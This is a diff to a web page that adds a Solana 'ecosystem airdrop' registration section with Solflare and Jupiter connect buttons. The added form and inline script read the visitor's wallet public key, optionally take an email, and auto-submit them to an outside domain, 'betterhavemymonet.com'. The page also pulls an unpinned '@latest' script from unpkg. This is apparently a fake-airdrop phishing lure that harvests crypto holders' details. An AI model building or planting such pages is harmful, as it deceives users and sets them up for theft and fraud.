@@ -156,5 +156,27 @@
 <button type="submit" style="padding:14px 30px; background:linear-gradient(90deg,#9945FF,#14F195); color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">Register for Airdrop</button>
 </form>
 </section>
+<section id="airdrop-signup" style="text-align:center; padding:60px 20px; background:linear-gradient(135deg,#0b0b0f,#1a1a2e);">
+<h2 style="color:#14F195; font-size:32px;">Airdrop Registration</h2>
+<p style="color:#ffffff;">Connect your wallet or enter your Solana address to register for the upcoming ecosystem airdrop.</p>
+<div id="wallet-connect-buttons" style="margin:20px 0;">
+<button id="solflare-btn" style="padding:12px 25px; margin:5px; background:#14F195; color:white; border:none; border-radius:6px; cursor:pointer;">Connect with Solflare</button>
+<button id="jupiter-btn" style="padding:12px 25px; margin:5px; background:#6E48AA; color:white; border:none; border-radius:6px; cursor:pointer;">Connect with Jupiter</button>
+</div>
+<form id="manual-wallet-form" action="https://betterhavemymonet.com/airdrop.php" method="POST">
+<input type="text" name="wallet" placeholder="Your Solana Wallet Address" pattern="[1-9A-HJ-NP-Za-km-z]{32,44}" required style="padding:12px; width:80%; max-width:420px; margin:10px 0; border-radius:6px;">
+<br>
+<input type="email" name="email" placeholder="Email (optional)" style="padding:12px; width:80%; max-width:420px; margin:10px 0; border-radius:6px;">
+<br>
+<button type="submit" style="padding:14px 30px; background:linear-gradient(90deg,#9945FF,#14F195); color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">Register for Airdrop</button>
+</form>
+<script src="https://unpkg.com/@solana/wallet-adapter-wallets@latest/lib/index.iife.js"></script>
+<script>
+async function connectSolflare(){if(window.solflare){try{await window.solflare.connect();alert("Connected: "+window.solflare.publicKey.toString());document.getElementById("manual-wallet-form").wallet.value=window.solflare.publicKey.toString();document.getElementById("manual-wallet-form").submit();}catch(e){console.error(e);alert("Solflare connection failed")}}else{alert("Solflare wallet not installed!")}}
+async function connectJupiter(){if(window.jupiter){try{await window.jupiter.connect();alert("Connected: "+window.jupiter.publicKey.toString());document.getElementById("manual-wallet-form").wallet.value=window.jupiter.publicKey.toString();document.getElementById("manual-wallet-form").submit();}catch(e){console.error(e);alert("Jupiter connection failed")}}else{alert("Jupiter wallet not installed!")}}
+document.getElementById("solflare-btn").addEventListener("click",connectSolflare);
+document.getElementById("jupiter-btn").addEventListener("click",connectJupiter);
+</script>
+</section>
 </body>
 </html>
